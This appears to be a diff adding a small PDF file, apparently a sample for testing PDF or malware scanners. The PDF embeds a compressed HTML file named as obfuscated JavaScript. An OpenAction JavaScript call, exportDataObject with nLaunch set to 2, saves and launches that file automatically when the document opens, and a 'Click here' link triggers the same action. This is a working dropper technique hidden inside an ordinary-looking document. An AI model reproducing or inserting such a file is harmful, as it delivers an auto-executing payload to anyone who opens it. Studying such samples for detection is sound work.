@@ -1,0 +1,118 @@
+%PDF-1.1
+%ÐÐÐÐ
+
+1 0 obj
+<<
+ /Type /Catalog
+ /Outlines 2 0 R
+ /Pages 3 0 R
+ /Names << /EmbeddedFiles << /Names [(HTML Javascript obfuscated.html) 7 0 R] >> >>
+ /OpenAction 9 0 R
+>>
+endobj
+
+2 0 obj
+<<
+ /Type /Outlines
+ /Count 0
+>>
+endobj
+
+3 0 obj
+<<
+ /Type /Pages
+ /Kids [4 0 R]
+ /Count 1
+>>
+endobj
+
+4 0 obj
+<<
+ /Type /Page
+ /Parent 3 0 R
+ /MediaBox [0 0 612 792]
+ /Contents 5 0 R
+ /Resources <<
+             /ProcSet [/PDF /Text]
+             /Font << /F1 6 0 R >>
+            >>
+ /Annots [10 0 R]
+>>
+endobj
+
+5 0 obj
+<< /Length 236 >>
+stream
+BT /F1 12 Tf 70 700 Td 15 TL (This PDF document embeds file HTML Javascript obfuscated.html) Tj () ' () ' (Click inside the rectangle to save HTML Javascript obfuscated.html to a temporary folder and launch it.) ' () ' (Click here) ' ET
+endstream
+endobj
+
+6 0 obj
+<<
+ /Type /Font
+ /Subtype /Type1
+ /Name /F1
+ /BaseFont /Helvetica
+ /Encoding /MacRomanEncoding
+>>
+endobj
+
+7 0 obj
+<<
+ /Type /Filespec
+ /F (HTML Javascript obfuscated.html)
+ /EF << /F 8 0 R >>
+>>
+endobj
+
+8 0 obj
+<<
+ /Length 377
+ /Filter /FlateDecode
+ /Type /EmbeddedFile
+>>
+stream
+xœÅRÁjÂ@õ,øƒBUÐDmÒ¦‹ŠÛJõÒã&™˜­ë&ìnÔü}g£ÕC{,BfÙ¼÷æÍäy³õËÂ¯U½§·ñ‡­KzQIúþ:áìgˆ¹@Si—4îQ1:T<3ÚUºCHc0	î€):q®Cf0r<—”¬â<þ&”™Èj”¦c‰ìX	Û#ˆÒ¶4¨0ê@ªÎD.7T«×,—–J•×	F0{ŸLëŸlÏN÷L 2­æóå¦Ù®ŸÆ\nA°\†	j°€U	 ÿ#ŸDçå¾õ}ÏsßùÙð¦ÑïþªëµäÚ.l„	S,¤-ŽÚZß¼TýJ…žÊ¿8½ŽËµåB@P˜Ó­S«¶©Ú’’…ý‡sIL‰&ÇL¤
+UûDå{K{e©fL›¸É§eP€”èœ´âƒ^oØíÝvw°t`Á6,Â°Mjns›÷ü/¼%ó3
+endstream
+endobj
+
+9 0 obj
+<<
+ /Type /Action
+ /S /JavaScript
+ /JS (this.exportDataObject({ cName: "HTML Javascript obfuscated.html", nLaunch: 2 });)
+>>
+endobj
+
+10 0 obj
+<<
+ /Type /Annot
+ /Subtype /Link
+ /Rect [65 620 130 640]
+ /Border [16 16 1]
+ /A 9 0 R
+>>
+endobj
+
+xref
+0 11
+0000000000 65535 f
+0000000019 00000 n
+0000000201 00000 n
+0000000257 00000 n
+0000000326 00000 n
+0000000550 00000 n
+0000000845 00000 n
+0000000969 00000 n
+0000001074 00000 n
+0000001558 00000 n
+0000001707 00000 n
+trailer
+<<
+ /Size 11
+ /Root 1 0 R
+>>
+startxref
+1823
+%%EOF
